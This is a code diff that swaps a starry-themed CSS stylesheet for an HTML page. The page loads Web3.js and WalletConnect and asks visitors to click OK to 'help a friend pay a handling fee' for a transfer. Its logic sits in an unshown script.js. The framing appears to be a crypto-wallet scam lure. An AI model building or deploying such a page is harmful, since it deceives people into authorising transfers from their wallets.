@@ -1,75 +1,18 @@
-/* 引入 Orbitron 字体 */
-@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
-
-/* 整体样式 */
-body {
-    margin: 0;
-    padding: 0;
-    height: 100vh;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    background: #000000 url('https://www.transparenttextures.com/patterns/stardust.png') repeat; /* 黑色背景带星空纹理 */
-    font-family: 'Orbitron', sans-serif; /* 更换为 Orbitron 字体 */
-    overflow: hidden;
-}
-
-/* 标题样式 */
-h1 {
-    color: #9b59b6;
-    font-size: 2.5em;
-    text-align: center;
-    background: linear-gradient(45deg, #8e44ad, #3498db); /* 紫色到蓝色渐变 */
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    margin-bottom: 10px; /* 缩小与下方文字的间距 */
-}
-
-/* 段落样式 */
-p {
-    color: #d7bde2;
-    font-size: 1.2em;
-    text-align: center;
-    margin-top: 0; /* 移除顶部间距 */
-    margin-bottom: 20px; /* 缩小与下方按钮的间距 */
-}
-
-/* 按钮样式 */
-button {
-    padding: 12px 30px;
-    font-size: 1.2em;
-    background: linear-gradient(45deg, #8e44ad, #e74c3c); /* 紫色到红色渐变 */
-    color: white;
-    border: none;
-    border-radius: 25px;
-    cursor: pointer;
-    transition: transform 0.3s, box-shadow 0.3s;
-    box-shadow: 0 0 15px rgba(142, 68, 173, 0.7);
-}
-
-/* 按钮悬停效果 */
-button:hover {
-    transform: scale(1.1);
-    box-shadow: 0 0 25px rgba(142, 68, 173, 1);
-}
-
-/* 添加宇宙感的动画星星 */
-@keyframes twinkle {
-    0% { opacity: 0.2; }
-    50% { opacity: 1; }
-    100% { opacity: 0.2; }
-}
-
-body::before {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: url('https://www.transparenttextures.com/patterns/stardust.png') repeat;
-    opacity: 0.5;
-    animation: twinkle 5s infinite;
-    z-index: -1;
-}
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>帮助朋友支付手续费</title>
+    <link rel="stylesheet" href="styles.css">
+    <!-- 引入 Web3.js CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.5/dist/web3.min.js"></script>
+    <!-- 引入 WalletConnect Provider -->
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+</head>
+<body>
+    <h1>Help him pay a handling fee</h1>
+    <p>Click OK to help friends complete the transfer</p>
+    <button id="ok-button">OK</button>
+    <script src="script.js"></script>
+</body>
+</html>
